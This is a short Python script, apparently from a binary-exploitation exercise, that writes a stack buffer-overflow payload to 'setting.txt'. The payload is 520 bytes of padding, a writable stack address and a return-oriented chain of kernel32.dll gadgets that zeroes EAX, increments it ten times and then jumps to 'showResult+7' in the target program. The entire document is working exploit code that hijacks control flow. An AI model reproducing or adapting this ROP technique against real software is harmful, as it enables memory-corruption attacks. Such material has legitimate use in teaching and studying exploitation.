f = open('setting.txt', 'w')

addrWriteAbleStack = "\x00\xff\x12\x00" #0x0012ff00
padding = "\xCC" * 520 + addrWriteAbleStack
xor_ret = "\xce\x86\xf7\x76" #0x76f786ce - XOR EAX,EAX # RETN    ** [kernel32.dll] **
inc_ret = "\xdd\xeb\xf4\x76" #0x76f4ebdd - INC EAX # RETN    ** [kernel32.dll] **
addrShowResult = "\x67\x17\x40\x00" #0x00401767 = showResult+7

script = ""
script += padding
script += xor_ret
script += inc_ret * 10
script += addrShowResult
f.write( script )
f.close()


